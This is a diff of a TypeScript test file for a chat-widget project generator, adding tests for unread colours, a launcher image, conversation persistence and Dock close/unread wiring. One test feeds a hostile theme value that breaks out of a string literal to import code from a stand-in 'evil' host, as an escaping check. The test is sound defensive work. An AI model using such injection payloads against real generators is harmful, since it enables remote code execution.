@@ -96,6 +96,31 @@ describe('generateProject (widget + mock core)', () => {
     expect(element).not.toMatch(/setProperty\('--kai-color-primary', 'red'\)/);
   });
 
+  it('theme.unreadColor lands on the HOST element as --kai-color-unread, same setProperty treatment as accent', () => {
+    const files = generateProject(construct({ theme: { accent: '#e91e63', unreadColor: '#38BDF8', mode: 'dark' } }));
+    const element = file(files, 'src/element.tsx');
+    expect(element).toContain("ctx.element.style.setProperty('--kai-color-unread', \"#38BDF8\")");
+    // Same host-not-shadow-tree rule as accent (see the test above): never
+    // set inside App.tsx.
+    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-unread');
+  });
+
+  it('theme.unreadColor with NO accent still emits a ctx-taking facade that sets --kai-color-unread (no contrast-pairing machinery required)', () => {
+    const element = file(generateProject(construct({ theme: { unreadColor: '#38BDF8', mode: 'system' } })), 'src/element.tsx');
+    expect(element).toContain("ctx.element.style.setProperty('--kai-color-unread', \"#38BDF8\")");
+    // No accent means no --kai-color-primary and no contrast-foreground CSS.
+    expect(element).not.toContain('--kai-color-primary');
+    expect(element).not.toContain('--kai-color-primary-foreground');
+  });
+
+  it('a hostile unreadColor cannot break out of the emitted string literal (same guard as accent)', () => {
+    const hostile = "red'}; import('http://evil/x.js'); const y='";
+    const element = file(generateProject(construct({ theme: { unreadColor: hostile, mode: 'system' } })), 'src/element.tsx');
+    expect(element).not.toContain(`setProperty('--kai-color-unread', '${hostile}')`);
+    expect(element).toContain(`setProperty('--kai-color-unread', ${JSON.stringify(hostile)})`);
+    expect(element).not.toMatch(/setProperty\('--kai-color-unread', 'red'\)/);
+  });
+
   it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
     const pkg = (spec?: string) =>
       JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
@@ -235,12 +260,22 @@ describe('widget chrome (Task 19a)', () => {
     expect(app).toContain('<Dock label="acme-support">');
   });
 
-  it('launcherIcon renders an <img> launcher override, JSON.stringify-escaped', () => {
+  // Owner finding, 2026-08-26: a hand-rolled <img> left a permanently broken
+  // icon in kai dev's own live FAB when its URL never resolved. DockLauncherImage
+  // (ui/dock.tsx) is the graceful-degradation component — see src/ui/dock.test.tsx
+  // for its own render-level fallback behavior; this only asserts the WIRE.
+  it('launcherIcon renders a DockLauncherImage launcher override, JSON.stringify-escaped, and imports it', () => {
     const app = file(
       generateProject(construct({ widget: { launcherIcon: 'https://example.com/a.png' } })),
       'src/App.tsx',
     );
-    expect(app).toContain('launcher={<img src={"https://example.com/a.png"}');
+    expect(app).toContain('launcher={<DockLauncherImage src={"https://example.com/a.png"} />}');
+    expect(app).toContain("import { ChatThread, createKaiChat, Dock, DockLauncherImage } from '@kitn.ai/ui/solid';");
+  });
+
+  it('no launcherIcon: DockLauncherImage is not imported at all, not even unused', () => {
+    const app = file(generateProject(construct({ widget: { position: 'top-start' } })), 'src/App.tsx');
+    expect(app).not.toContain('DockLauncherImage');
   });
 
   it('a hostile launcherIcon cannot break out of the emitted string literal', () => {
@@ -1367,5 +1402,178 @@ describe('writeProject', () => {
 
     const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
     expect(manifest).toEqual(projectB.map((f) => f.path).sort());
+  });
+});
+
+describe('capabilities.conversations', () => {
+  it('threads conversations={true} and a wired localStorageStore onto ChatThread for local persistence', () => {
+    const app = file(
+      generateProject(construct({ capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).toContain('conversations={true}');
+    expect(app).toContain("import { localStorageStore } from '@kitn.ai/ui/solid'");
+    expect(app).toContain("localStorageStore('acme-support')");
+    expect(app).toContain('store={');
+  });
+
+  // Task 6 live-browser regression: ChatThread never mutates `messages`
+  // itself (chat-thread.tsx's own doc on `onConversationLoad`) — select/new/
+  // mount-restore all resolve through ChatThread's internal state (activeId,
+  // view, the list) but the actually-RENDERED thread only changes if the
+  // host wires `onConversationLoad` back to its own message store. Every
+  // jsdom test above this one passed `messages`/`store` explicitly and so
+  // could never catch the callback's absence — this asserts the emitted
+  // wire directly, at the layer that would have caught it (the previous
+  // version of this file emitted `conversations={true} store={...}` with NO
+  // `onConversationLoad` at all, and every other assertion in this describe
+  // block still passed).
+  it('wires onConversationLoad back to the chat store — without it, select/new/restore never change the rendered thread (Task 6 regression)', () => {
+    const app = file(
+      generateProject(construct({ capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).toContain('onConversationLoad={(messages) => chat.setMessages(() => messages)}');
+  });
+
+  it('wires a fetchStore for endpoint persistence, url JSON.stringify\'d', () => {
+    const app = file(
+      generateProject(
+        construct({ capabilities: { conversations: true, history: { persistence: 'endpoint', url: '/api/threads' } } }),
+      ),
+      'src/App.tsx',
+    );
+    expect(app).toContain("import { fetchStore } from '@kitn.ai/ui/solid'");
+    expect(app).toContain(`fetchStore(${JSON.stringify('/api/threads')})`);
+  });
+
+  it('no conversations capability: neither prop is emitted', () => {
+    const app = file(generateProject(construct()), 'src/App.tsx');
+    expect(app).not.toContain('conversations={true}');
+    expect(app).not.toContain('ConversationStore');
+  });
+
+  it('custom layout: conversations is NOT wired — declared loudly, matching CU-1\'s precedent', () => {
+    const app = file(
+      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).not.toContain('conversations={true}');
+  });
+});
+
+// Owner follow-up, 2026-08-26: closing the widget while its conversations
+// list was open left ChatThread's internal view state at 'list', so the NEXT
+// open landed back on the list instead of the default chat screen. Every
+// jsdom-level ChatThread test for this covers the component itself
+// (chat-thread.test.tsx's own describe block); these assert the EMITTED wire
+// directly, at the layer that actually connects Dock's close notification to
+// ChatThread's reset — the same "layer that would have caught it" reasoning
+// as the onConversationLoad regression test above (a construct with no
+// wiring here would still pass every ChatThread-level test, since those
+// drive ChatThread's own controllerRef directly).
+describe('conversations + widget: reset the list view to chat on Dock close (owner follow-up)', () => {
+  it('declares chatController, wires it onto ChatThread, and wires Dock onOpenChange to reset it on close', () => {
+    const app = file(
+      generateProject(construct({ layout: 'widget', capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).toContain('let chatController: ChatThreadController | undefined;');
+    expect(app).toContain('controllerRef={(api) => (chatController = api)}');
+    expect(app).toContain('onOpenChange={(open) => { setDockOpen(open); if (!open) chatController?.closeConversationsList(); }}');
+    expect(app).toContain("import type { AttachmentData, ChatThreadController } from '@kitn.ai/ui/solid'");
+  });
+
+  it('no conversations capability on a widget: none of the reset wiring is emitted', () => {
+    const app = file(generateProject(construct({ layout: 'widget' })), 'src/App.tsx');
+    expect(app).not.toContain('chatController');
+    expect(app).not.toContain('ChatThreadController');
+  });
+
+  it('custom layout with conversations on: no reset wiring — there is no Dock to close/reopen', () => {
+    const app = file(
+      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).not.toContain('chatController');
+    expect(app).not.toContain('ChatThreadController');
+  });
+
+  it('composes with the header-close wiring (both closures declared, distinct names, no collision)', () => {
+    const app = file(
+      generateProject(
+        construct({
+          layout: 'widget',
+          header: { title: 'Acme Support' },
+          capabilities: { conversations: true, history: { persistence: 'local' } },
+        }),
+      ),
+      'src/App.tsx',
+    );
+    expect(app).toContain('let dockClose: (() => void) | undefined;');
+    expect(app).toContain('let chatController: ChatThreadController | undefined;');
+    expect(app).toContain('onClick={() => dockClose?.()}');
+    expect(app).toContain('onOpenChange={(open) => { setDockOpen(open); if (!open) chatController?.closeConversationsList(); }}');
+  });
+});
+
+// Unread indicators (owner round, 2026-08-26): row dots + a header-toggle
+// badge live entirely inside ChatThread (its own conversation-summary state);
+// the FAB's badge does not — Dock is a SIBLING, not a descendant, so the only
+// way for it to reflect "any conversation is unread" is the emitted App
+// mirroring ChatThread's report (onUnreadChange) onto Dock's own (pre-
+// existing, unchanged) `unread` prop. Same "layer that would have caught it"
+// reasoning as the onConversationLoad/reset-on-close regression tests above:
+// every ChatThread-level jsdom test drives `onUnreadChange` directly, so none
+// of them can catch the wire between ChatThread and Dock being absent.
+describe('conversations + widget: unread indicators wired onto Dock (owner round)', () => {
+  it('declares dockOpen/anyUnread signals, wires hostOpen/onUnreadChange onto ChatThread, and unread onto Dock', () => {
+    const app = file(
+      generateProject(construct({ layout: 'widget', capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).toContain('const [dockOpen, setDockOpen] = createSignal(false);');
+    expect(app).toContain('const [anyUnread, setAnyUnread] = createSignal(false);');
+    expect(app).toContain('hostOpen={dockOpen()} onUnreadChange={setAnyUnread}');
+    expect(app).toContain('unread={anyUnread()}');
+    expect(app).toContain("import { createSignal } from 'solid-js';");
+  });
+
+  it('dockOpen starts true when widget.defaultOpen is true — a widget open by default starts "seen"', () => {
+    const app = file(
+      generateProject(
+        construct({ layout: 'widget', widget: { defaultOpen: true }, capabilities: { conversations: true, history: { persistence: 'local' } } }),
+      ),
+      'src/App.tsx',
+    );
+    expect(app).toContain('const [dockOpen, setDockOpen] = createSignal(true);');
+  });
+
+  it('no conversations capability on a widget: none of the unread wiring is emitted', () => {
+    const app = file(generateProject(construct({ layout: 'widget' })), 'src/App.tsx');
+    expect(app).not.toContain('dockOpen');
+    expect(app).not.toContain('anyUnread');
+    expect(app).not.toContain('hostOpen');
+    expect(app).not.toContain('onUnreadChange');
+    expect(app).not.toContain('unread={');
+  });
+
+  it('custom layout with conversations on: no unread wiring — there is no Dock to badge', () => {
+    const app = file(
+      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
+      'src/App.tsx',
+    );
+    expect(app).not.toContain('dockOpen');
+    expect(app).not.toContain('anyUnread');
+  });
+});
+
+describe('CU-1: custom layout exclusion disclosure — conversations added', () => {
+  it('the emitted comment names conversations among the capabilities NOT wired on custom', () => {
+    const app = file(
+      generateProject(construct({ layout: 'custom', slots: ['header'] })),
+      'src/App.tsx',
+    );
+    expect(app).toContain('conversations');
   });
 });
